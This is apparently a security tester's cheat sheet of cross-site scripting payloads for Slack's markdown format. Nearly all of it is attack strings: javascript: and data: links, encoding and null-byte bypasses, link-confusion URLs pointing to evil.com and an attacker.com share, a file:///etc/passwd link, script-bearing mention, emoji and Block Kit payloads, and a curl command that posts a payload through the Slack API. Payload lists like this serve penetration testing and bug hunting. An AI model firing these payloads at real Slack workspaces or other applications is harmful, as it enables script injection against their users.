![Escape SRC - onload](blob:https://app.slack.com/e9459dcf-1dfb-4563-aba1-d9fdc58f3866)\
# Slack Markdown (mrkdwn) XSS Test Vectors

## Slack mrkdwn Syntax Overview
- Bold: *text*
- Italic: _text_
- Strike: ~text~
- Code: `code` or code block
- Links: <URL|text>
- User mentions: <@USER_ID>
- Channel mentions: <#CHANNEL_ID>
- Emoji: :emoji:
- Quotes: > text

---

## XSS Test Vectors

### 1. Link Injection Tests

<javascript:alert(1)|Click me>
<javascript:alert`1`|test>
<data:text/html,<script>alert(1)</script>|test>
<data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==|test>
<vbscript:msgbox(1)|test>
<javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>|x>


### 2. Protocol Handler Tests

<tel:1234567890|call>
<mailto:test@test.com|email>
<slack://channel?team=T1234&id=C1234|channel>
<file:///etc/passwd|file>
<\\\\attacker.com\\share|unc>


### 3. Unicode/Encoding Bypass Tests

<java\x00script:alert(1)|test>
<java\u0000script:alert(1)|test>
<\x6aavascript:alert(1)|test>
<javascript\x3aalert(1)|test>
<javascript&#58;alert(1)|test>
<javascript&#x3a;alert(1)|test>
<javasc&#x72;ipt:alert(1)|test>


### 4. URL Parsing Confusion

<https://slack.com@evil.com/path|link>
<https://evil.com\@slack.com|link>
<//evil.com|link>
<///evil.com|link>
<http:evil.com|link>
<https://slack.com%2f%2e%2e%2f%2e%2e@evil.com|test>


### 5. SVG/Image Injection (if images supported)

<data:image/svg+xml,<svg onload=alert(1)>|img>
<data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+|img>


### 6. User/Channel Mention Injection

<@U123|<script>alert(1)</script>>
<#C123|<img src=x onerror=alert(1)>>
<@U123|javascript:alert(1)>


### 7. Emoji Name Injection

:+ADw-script+AD4-alert(1)+ADw-/script+AD4-:
:<script>alert(1)</script>:
:"><img src=x onerror=alert(1)>:


### 8. Code Block Escape Attempts

javascript
</script><script>alert(1)//


`</code><img src=x onerror=alert(1)>`


\`</code><script>alert(1)</script>


### 9. Quote Block Injection

> <script>alert(1)</script>
>>> <img src=x onerror=alert(1)>


### 10. Nested/Recursive Parsing

*_~`<script>alert(1)</script>`~_*
<*bold*|link>
<_italic_|link>
<<nested>|outer>


### 11. Line Break/Null Byte Injection

<javascript:\nalert(1)|test>
<javascript:\ralert(1)|test>
<java\0script:alert(1)|test>


### 12. Attachment/Block Kit Payloads (API level)
json
{
  "blocks": [
    {
      "type": "section",
      "text": {
        "type": "mrkdwn",
        "text": "<javascript:alert(1)|XSS>"
      }
    }
  ]
}


### 13. Unfurl Payloads (Open Graph Injection)
When sharing a link, Slack unfurls it. Test with:
- og:title containing HTML
- og:description with script tags
- og:image with javascript: URL

### 14. Workflow Builder Payloads

{{trigger.user.name}}<script>alert(1)</script>
{{channel.name}}</p><script>alert(1)</script>


### 15. App Home Tab/Modal Payloads
json
{
  "type": "modal",
  "title": {"type": "plain_text", "text": "<script>alert(1)</script>"},
  "blocks": [...]
}


---

## Testing Methodology

1. **Direct Message Test**: Send each payload as a DM to yourself
2. **Channel Test**: Post in a test channel
3. **API Test**: Use Slack API to post messages with payloads
4. **Bot/App Test**: Create a bot that posts formatted messages
5. **Webhook Test**: Use incoming webhooks with payloads
6. **Search Test**: Search for injected content
7. **Notification Test**: Trigger notifications with payloads
8. **Export Test**: Export conversation and check HTML

---

## High Priority Vectors

Based on historical XSS in similar platforms:

1. **Link text injection**: `<URL|<malicious HTML>>`
2. **Markdown in user display names**: If names render markdown
3. **File name/comment XSS**: Upload files with XSS in metadata
4. **Custom emoji names**: Admin-uploaded emoji with bad names
5. **Workflow variable injection**: Untrusted data in workflows

---

## Tools for Testing

bash
# Slack API message posting
curl -X POST https://slack.com/api/chat.postMessage \
  -H "Authorization: Bearer xoxb-YOUR-TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"channel":"C1234","text":"<javascript:alert(1)|test>"}'

# Check response for rendered HTML

